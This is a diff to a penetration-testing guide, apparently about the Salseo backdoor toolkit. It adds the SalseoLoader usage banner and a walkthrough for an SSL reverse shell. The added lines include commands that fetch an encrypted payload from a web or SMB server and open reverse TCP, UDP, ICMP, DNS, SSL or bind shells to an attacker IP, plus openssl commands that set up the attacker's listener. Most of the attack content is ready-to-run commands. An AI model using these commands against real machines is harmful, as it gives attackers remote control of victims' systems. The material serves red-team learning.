@@ -94,6 +94,40 @@ Encrypterassembly.exe <FILE> <PASSWORD> <OUTPUT>
 #### Bringing the Encrypted EvilSalsa to the table with SalseoLoader
 SalseoLoader is in charge of loading the encrypted payload. Can be both compiled as a library or as an executable. If it is run as an executable, the chosen arguments must be provided when the executable is run. If it is compiled as a library, the descriptor "main" must be exported. Arguments are added using environmental variables.
 
+```
+  _____  ____  _     _____   ___   ___
+ / ___/ /    || |   / ___/  /  _] /   \
+(   \_ |  o  || |  (   \_  /  [_ |     |
+ \__  ||     || |___\__  ||    _]|  O  |
+ /  \ ||  _  ||     /  \ ||   [_ |     |
+ \    ||  |  ||     \    ||     ||     |
+  \___||__|__||_____|\___||_____| \___/
+
+  _       ___    ____  ___      ___  ____
+ | |     /   \  /    ||   \    /  _]|    \
+ | |    |     ||  o  ||    \  /  [_ |  D  )
+ | |___ |  O  ||     ||  D  ||    _]|    /
+ |     ||     ||  _  ||     ||   [_ |    \
+ |     ||     ||  |  ||     ||     ||  .  \
+ |_____| \___/ |__|__||_____||_____||__|\_|
+
+                             By: CyberVaca@HackPlayers
+
+[+] Usage:
+
+    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT
+    [-] SalseoLoader.exe password \\smbserver.com\evil\elfuckingmal.txt ReverseUDP LHOST LPORT
+    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseICMP LHOST
+    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS
+    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
+    [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
+
+[+] Shells availables:
+
+    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL
+    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP
+```
+
 # Tutorial
 
 ## Compiling the binaries
@@ -146,6 +180,19 @@ Remember to start a nc as the reverse shell listener, and a HTTP server to serve
 Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
 
 `SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>`
+
+### Getting a TCP reverse shell SSL (using local file)
+
+**Set the listener inside the attacker machine:**
+
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -key key.pem -cert cert.pem -port <port> -tls1
+```
+**Execute the backdoor:**
+```
+SalseoLoader.exe password C:/path/to/evilsalsa.dll.txt ReverseSSL <Attacker-IP> <Port>
+```
 
 ### Getting a ICMP reverse shell (encoded dll already inside the victim)
 
